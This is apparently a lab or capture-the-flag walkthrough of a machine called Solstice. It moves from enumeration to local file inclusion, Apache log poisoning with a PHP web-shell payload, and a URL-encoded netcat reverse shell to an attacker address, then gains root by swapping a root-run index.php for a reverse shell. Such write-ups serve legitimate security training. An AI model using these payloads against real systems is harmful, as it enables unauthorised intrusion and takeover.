Solstice

Target IP: 192.168.186.72

Scanning



This target host has many TCP ports open. Looks like there are three FTP applications running on ports 21, 2121, and 62524. There are SSH and SMTP on the standard ports. Also, there are three HTTP applications on ports 80, 3128, 8593, an 54787. I will start enumeration with the FTP applications first.

Enumeration

Ports 21, 2121, and 62524: FTP

The FTP running on standard port 21 does not allow anonymous access. I need valid credentials in order to access data on this port.


The FTP application on port 2121 is interesting. I can login as anonymous; however, there are no contents inside the directory called pub.


I am unable to connect to the FTP application on port 62524. I did not find anything useful from enumerating all the different FTP ports. However, the FTP on 2121 is interesting.

Ports 80, 3128, 8593, 54787: HTTP

The webpage above is displayed for the HTTP application on port 80. Viewing the source code of this webpage shows it is phpIPAM 1.4. I did not find anything useful after doing a directory search against this port application.


The webpage above is shown for the application on port 3128. The interesting part is the name and version of this application which is Squid 4.6. Doing a directory search against this port did not lead to anything useful.


This application is interesting. The webpage above is displayed for this application.


Doing a source-code review of this PHP page shows an interesting parameter called book in line nine. This parameter seems to be including a file. Maybe it is vulnerable to LFI or RFI attacks?


And bingo! The host is vulnerable to LFI as I was able to obtain the /etc/passwd using the payload http://192.168.186.72:8593/index.php?book=../../../../../../../../etc/passwd. From the picture above, I notice a user called miguel. Trying to obtain the SSH key of user miguel did not work. And, the target machine is not vulnerable to RFI attacks as I was unable to include the pages of the different HTTP applications. Time to fuzz this application further.


Using the command ffuf -u http://192.168.186.72:8593/index.php?book=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -fs 376 | grep ".log", I tried to find all possible log files I could poison. I obtained two files as shown above: access.log and error.log. And both files are poisonable.

Exploitation


To exploit the machine, I sent the curl payload curl 192.168.186.72 -A "<?php system(\$_GET['cmd'])?>" as shown above.


And the output from the command whoami;id;ls is shown above. Time to obtain a reverse shell connection now.


To obtain a reverse shell connection from the target host, I used the payload below. I started a listener on port 8443 and sent the payload to the target machine, and I obtained a connection back! Now I have a foothold on the target machine as www-data.
Payload: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.222%208443%20%3E%2Ftmp%2Ff.
URL with payload: http://192.168.186.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.222%208443%20%3E%2Ftmp%2Ff

Privilege Escalation

After some manual enumeration, I found something.


Running ps -aux shows the directory /var/tmp/sv is executed as root. There is a file inside this directory called index.php. Maybe we can place a reverse shell script inside this file to gain a root shell. The port of this application is 57.


I replaced the index.php with a PHP reverse shell script. Then I started a listener on port 8444. To invoke the PE, I used curl 127.0.0.1:57 from the foothold machine.


And then I gained a reverse shell connection as root!
